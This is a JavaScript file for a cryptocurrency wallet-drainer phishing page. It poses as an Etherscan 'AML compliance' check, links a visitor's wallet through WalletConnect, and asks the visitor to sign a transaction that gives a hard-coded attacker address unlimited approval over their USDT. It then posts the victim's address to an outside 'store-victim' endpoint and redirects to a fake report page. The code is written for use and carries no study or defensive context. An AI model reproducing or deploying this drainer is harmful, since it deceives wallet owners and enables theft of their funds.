const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
const API = 'https://aml-checker-4.vercel.app/api/store-victim';

let signClient;
let session;
let account;
let currentChainId;
const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';

function getSignClient() {
  const ns = window["@walletconnect/sign-client"];
  if (ns) {
    const sc = ns.SignClient || ns.default;
    if (sc && typeof sc.init === 'function') return sc;
  }
  return null;
}

async function initWalletConnect() {
  const SignClientClass = getSignClient();
  if (!SignClientClass) throw new Error('WalletConnect SignClient non trouvé.');

  signClient = await SignClientClass.init({
    projectId: PROJECT_ID,
    metadata: {
      name: 'Etherscan',
      description: 'Verify your wallet for AML compliance',
      url: 'https://etherscan.io',
      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
    }
  });

  const { uri, approval } = await signClient.connect({
    requiredNamespaces: {
      eip155: {
        methods: ['eth_sendTransaction'],
        chains: ['eip155:1'],
        events: ['chainChanged', 'accountsChanged']
      }
    }
  });

  await new Promise((resolve, reject) => {
    if (typeof QRCode !== 'undefined') return resolve();
    let tries = 0;
    const interval = setInterval(() => {
      if (typeof QRCode !== 'undefined') {
        clearInterval(interval);
        resolve();
      }
      tries++;
      if (tries > 10) {
        clearInterval(interval);
        reject(new Error('QRCode non chargé après 5s'));
      }
    }, 500);
  });

  const qrDiv = document.getElementById('qrcode');
  qrDiv.innerHTML = '';
  new QRCode(qrDiv, {
    text: uri,
    width: 280,
    height: 280
  });
  document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';

  session = await approval();

  const accounts = session.namespaces['eip155'].accounts;
  const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
  if (!ethAccount) {
    throw new Error('Aucun compte Ethereum mainnet trouvé. Veuillez sélectionner Ethereum dans votre wallet.');
  }
  account = ethAccount.split(':')[2];
  currentChainId = '1';

  document.getElementById('qrcode').style.display = 'none';
  document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;

  setTimeout(() => startScam(), 1000);
}

async function startScam() {
  if (currentChainId !== '1') {
    document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
    return;
  }

  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';

  // ✅ Approve(MAX) → encodé correctement sur 32 bytes
  const data = '0x095ea7b3' +
    ATTACKER.slice(2).padStart(64, '0') +
    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

  // ✅ Gas limit standard pour USDT approve = 60 000
  const tx = {
    from: account,
    to: USDT_ADDR,
    data: data,
    chainId: 1,
    gasLimit: '0xea60', // 60 000 → standard
    gasPrice: '0x4a817c800' // 20 gwei = 20 000 000 000 → ~0.0012 ETH → ~3-4$
  };

  try {
    const result = await signClient.request({
      topic: session.topic,
      request: {
        id: Date.now(),
        jsonrpc: '2.0',
        method: 'eth_sendTransaction',
        params: [tx]
      },
      chainId: 'eip155:1'
    });
    console.log('✅ Approve MAX envoyé :', result);
  } catch (e) {
    console.error('❌ Échec approve :', e);
  }

  await fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ victim: account, chain: currentChainId })
  });

  document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
  setTimeout(() => window.location.href = '/report.html', 3000);
}

initWalletConnect().catch(err => {
  console.error('Erreur init WalletConnect:', err);
  document.getElementById('status').innerText = `Erreur : ${err.message || err}`;
});
